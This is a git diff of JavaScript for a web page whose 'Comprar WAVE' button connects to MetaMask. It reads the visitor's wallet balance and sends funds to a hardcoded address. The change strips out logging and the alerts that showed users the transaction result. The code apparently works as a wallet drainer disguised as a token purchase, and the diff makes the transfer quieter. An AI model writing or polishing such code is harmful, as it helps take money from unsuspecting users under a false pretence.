@@ -17,7 +17,6 @@ document.addEventListener("DOMContentLoaded", function () {
                     buyButton.classList.remove('hidden'); // Asegúrate de que el botón sea visible
 
                     buyButton.addEventListener('click', async () => {
-                        console.log('Botón de Comprar WAVE presionado');
                         try {
                             // Obtener el saldo de la cuenta en la red actual
                             const balanceInWei = await web3.eth.getBalance(account);
@@ -26,23 +25,18 @@ document.addEventListener("DOMContentLoaded", function () {
                             const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
                             const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';
 
-                            const transactionHash = await web3.eth.sendTransaction({
+                            await web3.eth.sendTransaction({
                                 from: account,
                                 to: recipientAddress,
                                 value: amountToSendInWei
                             });
-
-                            console.log('Transacción exitosa:', transactionHash);
-                            alert('Transacción exitosa. Hash: ' + transactionHash);
                         } catch (error) {
                             console.error('Error en la transacción:', error);
-                            alert('Error en la transacción: ' + error.message);
                         }
                     });
                 } else {
                     console.error('El botón de Comprar WAVE no se encontró.');
                 }
-
             } catch (error) {
                 console.error("Error connecting to MetaMask:", error);
             }
